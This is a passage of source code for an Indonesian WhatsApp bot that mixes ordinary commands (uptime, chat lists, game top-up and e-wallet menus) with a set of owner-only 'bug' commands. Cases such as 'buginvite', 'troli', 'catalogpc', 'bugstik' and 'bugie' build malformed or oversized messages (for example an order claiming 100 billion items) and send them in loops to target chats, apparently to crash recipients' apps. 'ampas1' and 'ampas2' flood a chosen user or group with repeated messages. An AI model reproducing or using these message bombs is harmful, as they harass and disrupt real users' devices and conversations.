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\nX-WA-BIZ-DESCRIPTION:Developer RAHXMODSWhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:liaacans\nEND:VCARD",
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
}
break
case 'lokas': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/thumbnail.jpg') }, { upload: liaacans.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© Kizu-MD`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
break
case 'buglokas': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/thumbnail.jpg') }, { upload: liaacans.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© ${global.creator}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, location.message, { messageId: location.key.id })
}
break
case 'buginvite': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/thumbnail.jpg') }, { upload: liaacans.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `Bug By NainOfc`,
"groupName": `Awoaawokaowk`,
"caption": `${global.creator}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
break
case 'troli': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/thumbnail.jpg') }, { upload: liaacans.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": "449756950375071",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© Awoakwoakwok`,
"jpegThumbnail":fs.readFileSync('./image/image.jpg'),
"orderTitle": `© ${global.creator}`,
"sellerJid": "6285714170944@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
case 'catalog': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/thumbnail.jpg') }, { upload: liaacans.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `© Bug By NainOfc`,
"description": `© Awokaowk`,
"currencyCode": "IDR",
"footerText": `© ${global.creator}`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© ${global.creator}`,
"url": "wa.me/6285714170944"
},
"businessOwnerJid": "6285714170944@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
case 'catalogpc': case 'cataloggc':  {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/thumbnail.jpg') }, { upload: liaacans.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `© Bug By NainOfc`,
"description": `© AwoKaok`,
"currencyCode": "IDR",
"footerText": `© ${global.creator}`,
"productImageCount": 1,
"firstImageId": 1,
"retailerId": `© ${global.creator}`,
"url": "wa.me/6285714170944"
},
"businessOwnerJid": "6285714170944@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc})
liaacans.relayMessage(num, catalog.message, { messageId: catalog.key.id })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
m.reply(tekteka)
}
break
case 'ampas1' : {
if (!isCreator) throw mess.owner
if (!m.isGroup) throw mess.group
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await liaacans.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
}
break
case 'ampas2' : {
if (!isCreator) throw mess.owner
if (!m.isGroup) throw mess.group
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
a = await liaacans.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(10000)
}
break
case 'bugstik':{
if (!isCreator) throw mess.owner
if (!m.isGroup) throw mess.group
if (args.length == 0) return anjay(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Kizu-MD`
for (let i = 0; i < jumlah; i++) {
liaacans.sendMessage(m.chat, {sticker: global.thumb},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
}
deploy(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'bugie':{
if (!isCreator) throw mess.owner
if (!m.isGroup) throw mess.group
if (args.length == 0) return anjay(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Kizu-MD`
for (let i = 0; i < jumlah; i++) {
liaacans.sendMessage(m.chat, {document: global.thumb},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `RAHXMODS`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
}
}
}})
}
m.reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'bugtag': {
if (!isCreator) throw mess.owner
if (!m.isGroup) throw mess.group
liaacans.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: doc })
}
break
case 'runtime': case 'tes': {
if (cekUser("id", m.sender) == null) throw mess.user
            	let lowq = `*Bot Telah Online Selama*\n*${runtime(process.uptime())}*`
                let buttons = [{ buttonId: 'donasi', buttonText: { displayText: 'DONASI' }, type: 1 }]
                await liaacans.sendButtonText(m.chat, buttons, lowq, creator, m, { quoted: fkontak })
                }
            break
case 'setppbot': {
                if (!isCreator) throw mess.owner
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await liaacans.downloadAndSaveMediaMessage(quoted)
                await liaacans.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
case 'listonline': case 'liston': {
            if (!isCreator) throw mess.owner
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    liaacans.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
case 'listpc': {
      if (!isCreator) throw mess.owner
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 liaacans.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                if (!isCreator) throw mess.owner
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await liaacans.groupMetadata(i)
                     teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 liaacans.sendTextWithMentions(m.chat, teks, m)
             }
             break
case 'jadibot': { // Fix Aja Kalau Bisa Kak!
if(!isPremium) throw mess.prem
jadibot(liaacans, m, m.chat)
}
break
case 'listjadibot':
if (!isPremium) throw mess.prem
try {
let user = [... new Set([...global.conns.filter(liaacans => liaacans.user).map(liaacans => liaacans.user)])]
te = "*List Jadibot*\n\n"
for (let i of user){
let y = await liaacans.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
liaacans.sendMessage(m.chat,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
m.reply(`Belum Ada User Yang Jadibot`)
}
break
case 'topupmenu': {
if (cekUser("id", m.sender) == null) throw mess.user
topup = `*｢  TOPUP MENU OTOMATIS  ｣*
  ● ${prefix}topup
  ● ${prefix}topupff
  ● ${prefix}topupml
  ● ${prefix}topupml2
  ● ${prefix}listdml2
  ● ${prefix}listdmff
  ● ${prefix}listdmml
  ● ${prefix}topupff2
  ● ${prefix}listdmff2
  ● ${prefix}mlsmile (Owner Only)
    
  *｢ STORE MENU ｣*
 ● ${prefix}item
 ● ${prefix}additem
 ● ${prefix}delitem
 ● ${prefix}changeitem
 ● proses
 ● done

  *｢ JASA SUNTIK SOSMED ｣*
  ● ${prefix}order ( cara order) 
  ● ${prefix}followers [jum|targ] 
  ● ${prefix}view [jum|link] 
  ● ${prefix}like [jum|link] 
  ● ${prefix}cekstatus [id] 
  ● ${prefix}prichlist`
 let buttons = [{ buttonId: 'menu', buttonText: { displayText: 'Menu' }, type: 1 }]
liaacans.sendButtonText(m.chat, buttons, topup, creator)
}
break 
case 'tts':{
if (cekUser("id", m.sender) == null) throw mess.user
if (!q) return m.reply(`Contoh:\n${prefix+command} hallo bro`)
var tts = `https://saipulanuar.ga/api/text-to-audio/tts?text=${q}&idbahasa=id&apikey=jPHjZpQF`
liaacans.sendMessage(m.sender, {audio:{url:tts}, mimetype:'audio/mpeg', ptt:true}, {quoted:fvn})
}
break
case 'shopeepay':{
if (cekUser("id", m.sender) == null) throw mess.user
if (m.isGroup) return m.reply('Fitur Ini Hanya Bisa Digunakan Di Private Chat!')
let noshp = text
if (isNaN(parseInt(noshp))) return m.reply(`${command} 6285737134572`)
const sections = [
    {
	title: `Convert ShopeePay`,
	rows: [
	    {title: "Rp10.000", rowId: `${prefix}cvspay ${noshp}|1`}
	]
    },
    {
	title: `Convert ShopeePay`,
	rows: [
	    {title: "Rp20.000", rowId: `${prefix}cvspay ${noshp}|2`}
	]
    },
    {
	title: `Convert ShopeePay`,
	rows: [
	    {title: "Rp25.000", rowId: `${prefix}cvspay ${noshp}|3`}
	]
    },
    {
	title: `Convert ShopeePay`,
	rows: [
	    {title: "Rp50.000", rowId: `${prefix}cvspay ${noshp}|4`}
	]
    },
    {
	title: `Convert ShopeePay`,
	rows: [
	    {title: "Rp60.000", rowId: `${prefix}cvspay ${noshp}|6`}
	]
    },
    {
	title: `Convert ShopeePay`,
	rows: [
	    {title: "Rp75.000", rowId: `${prefix}cvspay ${noshp}|7`}
	]
    },
    {
	title: `Convert ShopeePay`,
	rows: [
	    {title: "Rp100.000", rowId: `${prefix}cvspay ${noshp}|8`}
	]
    },
    {
	title: `Convert ShopeePay`,
	rows: [
	    {title: "Rp200.000", rowId: `${prefix}cvspay ${noshp}|10`}
	]
    },
]
let isian = `    
Silahkan Pilih Nominal Saldo E-wallet Yang Akan Anda Convert Ke Shopeepay!.

Note: Pembayaran Disini Hanya Menggunakan Server, Owner Tidak Mendapatkan Hasil Apapun Disini Karena Diproses Langsung Dari Server!.

Jika Sudah Melakukan Pemilihan Nominal, Anda Akan Dikirimkan Qris Pembayaran Dan Anda Harus Membayar Melalu Aplikasi E-wallet Yang Mendukung Qris, Pastikan Nominal Yang Anda Krimkan Harus Sama Dengan Nominal Yang Diminta!.

Jika Anda Sudah Melakukan Pembayaran, Silahkan Tunggu 1-5 Menit Dan Melakukan Pengecekan Secara Berkala Pada Saldo Anda!.`
const listMessage = {
  text: isian,
  footer: "Created By Kizu-MD",
  title: "━━[ Nominal saldo Shopeepay ]━━",
  buttonText: "Klik Disini",
  sections
}
const tessgh = await liaacans.sendMessage(m.chat, listMessage)
break
}
case 'ovo':{
if (cekUser("id", m.sender) == null) throw mess.user
if (m.isGroup) return m.reply('Fitur Ini Hanya Bisa Digunakan Di Private Chat!')
let noshp = text
if (isNaN(parseInt(noshp))) return m.reply(`${command} 6281236167286`)
const sections = [
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp20.000", rowId: `${prefix}cvspay ${noshp}|11`}
	]
    },
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp25.000", rowId: `${prefix}cvspay ${noshp}|12`}
	]
    },
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp30.000", rowId: `${prefix}cvspay ${noshp}|13`}
	]
    },
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp40.000", rowId: `${prefix}cvspay ${noshp}|14`}
	]
    },
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp50.000", rowId: `${prefix}cvspay ${noshp}|15`}
	]
    },
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp60.000", rowId: `${prefix}cvspay ${noshp}|16`}
	]
    },
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp70.000", rowId: `${prefix}cvspay ${noshp}|17`}
	]
    },
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp75.000", rowId: `${prefix}cvspay ${noshp}|18`}
	]
    },
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp90.000", rowId: `${prefix}cvspay ${noshp}|19`}
	]
    },
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp100.000", rowId: `${prefix}cvspay ${noshp}|20`}
	]
    },
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp125.000", rowId: `${prefix}cvspay ${noshp}|21`}
	]
    },
     {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp150.000", rowId: `${prefix}cvspay ${noshp}|22`}
	]
    },
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp200.000", rowId: `${prefix}cvspay ${noshp}|22`}
	]
    },
]
let isian = `    
Silahkan Pilih Nominal Saldo E-wallet Yang Akan Anda Convert Ke Ovo!.

Note: Pembayaran Disini Hanya Menggunakan Server, Owner Tidak Mendapatkan Hasil Apapun Disini Karena Diproses Langsung Dari Server!.

Jika Sudah Melakukan Pemilihan Nominal, Anda Akan Dikirimkan Qris Pembayaran Dan Anda Harus Membayar Melalu Aplikasi E-wallet Yang Mendukung Qris, Pastikan Nominal Yang Anda Krimkan Harus Sama Dengan Nominal Yang Diminta!.

Jika Anda Sudah Melakukan Pembayaran, Silahkan Tunggu 1-2 Menit Dan Melakukan Pengecekan Secara Berkala Pada Saldo Anda!.`
const listMessage = {
  text: isian,
  footer: "Created By Kizu-MD",
  title: "━━[ Nominal saldo Ovo ]━━",
  buttonText: "Klik Disini",
  sections
}
const tessgh = await liaacans.sendMessage(m.chat, listMessage)
break
}
case 'cvspay': {
if (cekUser("id", m.sender) == null) throw mess.user
if (m.isGroup) return m.reply('Fitur Ini Hanya Bisa Digunakan Di Private Chat!')
let idff = text.split("|")[0]
let produkid = text.split("|")[1]
let cvnya = await convertSaldo(`${produkid}`, `${idff}`)
let byr = `*─ 「 CEK TRANSAKSIMU 」 ─*
     
_Berikut Adalah Transaksi Anda_
_》Saldo : ${cvnya.product}_
_》No Tujuan : ${idff}_
_》Total Tagihan : ${cvnya.tagihan}_
_》Id Trx : ${cvnya.order_id}_

Silahkan Scan Qris Diatas Untuk Melakukan Pembayaran
Saldo Akan Masuk Otomatis Dalam Waktu 1-5 Menit Setelah Melakukan Pembayaran!.`
liaacans.sendMessage(m.chat, { image: { url: cvnya.img }, caption: `${byr}` }, { quoted: m })
break
}
case 'topup':{
if (cekUser("id", m.sender) == null) throw mess.user
const sections = [
    {
	title: `Format: ${prefix}topupff id|jumlah`,
	rows: [
	    {title: "List Diamond Free Fire", rowId: `${prefix}listdmff`}
	]
    },
    {
	title: `Format: ${prefix}topupff2 id|jumlah`,
	rows: [
	    {title: "List Diamond Free Fire Server 2", rowId: `${prefix}listdmff2`}
	]
    },
   {
   	title: `Format: ${prefix}topupml id|server|jumlah`,
	rows: [
	    {title: "List Diamond Mobile Legends", rowId: `${prefix}listdmml`}
	]
    },
   {
   	title: `Format: ${prefix}topupml2 id|server|jumlah`,
	rows: [
	    {title: "List Diamond Mobile Legends Server 2", rowId: `${prefix}listdmml2`}
	]
    },
]
let isian = `    
_Berikut Adalah Data Akun Anda_
_》Name : ${pushname}_
_》Id : ${m.sender.replace("@s.whatsapp.net", "")}_

Note: Owner Paling Gnteng/Cntip`
const listMessage = {
  text: isian,
  footer: "Created By Kizu-MD",
  title: "━━[ List Topup LiaaCans ]━━",
  buttonText: "Klik Disini",
  sections
}
const tessgh = await liaacans.sendMessage(m.chat, listMessage)
break
}
case 'listdmff':
if (cekUser("id", m.sender) == null) throw mess.user
lisnya = `*── 「 DIAMOND FREE FIRE 」 ──*

_》${list.ff.FF5.nama} : ${list.ff.FF5.harga}_
_》${list.ff.FF10.nama} : ${list.ff.FF10.harga}_
_》${list.ff.FF15.nama} : ${list.ff.FF15.harga}_
_》${list.ff.FF20.nama} : ${list.ff.FF20.harga}_
_》${list.ff.FF25.nama} : ${list.ff.FF25.harga}_
_》${list.ff.FF30.nama} : ${list.ff.FF30.harga}_
_》${list.ff.FF40.nama} : ${list.ff.FF40.harga}_
_》${list.ff.FF50.nama} : ${list.ff.FF50.harga}_
_》${list.ff.FF55.nama} : ${list.ff.FF55.harga}_
_》${list.ff.FF60.nama} : ${list.ff.FF60.harga}_
_》${list.ff.FF70.nama} : ${list.ff.FF70.harga}_
_》${list.ff.FF75.nama} : ${list.ff.FF75.harga}_
_》${list.ff.FF80.nama} : ${list.ff.FF80.harga}_
_》${list.ff.FF90.nama} : ${list.ff.FF90.harga}_
_》${list.ff.FF95.nama} : ${list.ff.FF95.harga}_
_》${list.ff.FF100.nama} : ${list.ff.FF100.harga}_
_》${list.ff.FF120.nama} : ${list.ff.FF120.harga}_
_》${list.ff.FF130.nama} : ${list.ff.FF130.harga}_
_》${list.ff.FF140.nama} : ${list.ff.FF140.harga}_
_》${list.ff.FF145.nama} : ${list.ff.FF145.harga}_
_》${list.ff.FF150.nama} : ${list.ff.FF150.harga}_
_》${list.ff.FF160.nama} : ${list.ff.FF160.harga}_
_》${list.ff.FF180.nama} : ${list.ff.FF180.harga}_
_》${list.ff.FF190.nama} : ${list.ff.FF190.harga}_
_》${list.ff.FF200.nama} : ${list.ff.FF200.harga}_
_》${list.ff.FF210.nama} : ${list.ff.FF210.harga}_
_》${list.ff.FFM.nama} : ${list.ff.FFM.harga}_
_》${list.ff.FF250.nama} : ${list.ff.FF250.harga}_
_》${list.ff.FF280.nama} : ${list.ff.FF280.harga}_
_》${list.ff.FF300.nama} : ${list.ff.FF300.harga}_
_》${list.ff.FF355.nama} : ${list.ff.FF355.harga}_
_》${list.ff.FF350.nama} : ${list.ff.FF350.harga}_
_》${list.ff.FF375.nama} : ${list.ff.FF375.harga}_
_》${list.ff.FF400.nama} : ${list.ff.FF400.harga}_
_》${list.ff.FF405.nama} : ${list.ff.FF405.harga}_
_》${list.ff.FF425.nama} : ${list.ff.FF425.harga}_
_》${list.ff.FF475.nama} : ${list.ff.FF475.harga}_
_》${list.ff.FF500.nama} : ${list.ff.FF500.harga}_
_》${list.ff.FF510.nama} : ${list.ff.FF510.harga}_
_》${list.ff.FF515.nama} : ${list.ff.FF515.harga}_
_》${list.ff.FF512.nama} : ${list.ff.FF512.harga}_
_》${list.ff.FF545.nama} : ${list.ff.FF545.harga}_
_》${list.ff.FF565.nama} : ${list.ff.FF565.harga}_
_》${list.ff.FF600.nama} : ${list.ff.FF600.harga}_
_》${list.ff.FF635.nama} : ${list.ff.FF635.harga}_
_》${list.ff.FF645.nama} : ${list.ff.FF645.harga}_
_》${list.ff.FF655.nama} : ${list.ff.FF655.harga}_
_》${list.ff.FF720.nama} : ${list.ff.FF720.harga}_
_》${list.ff.FF700.nama} : ${list.ff.FF700.harga}_
_》${list.ff.FF770.nama} : ${list.ff.FF770.harga}_
_》${list.ff.FF790.nama} : ${list.ff.FF790.harga}_
_》${list.ff.FF800.nama} : ${list.ff.FF800.harga}_
_》${list.ff.FF860.nama} : ${list.ff.FF860.harga}_
_》${list.ff.FF930.nama} : ${list.ff.FF930.harga}_
_》${list.ff.FF1000.nama} : ${list.ff.FF1000.harga}_
_》${list.ff.FF1050.nama} : ${list.ff.FF1050.harga}_
_》${list.ff.FF1075.nama} : ${list.ff.FF1075.harga}_
_》${list.ff.FF1080.nama} : ${list.ff.FF1080.harga}_
_》${list.ff.FFB.nama} : ${list.ff.FFB.harga}_
_》${list.ff.FF1200.nama} : ${list.ff.FF1200.harga}_
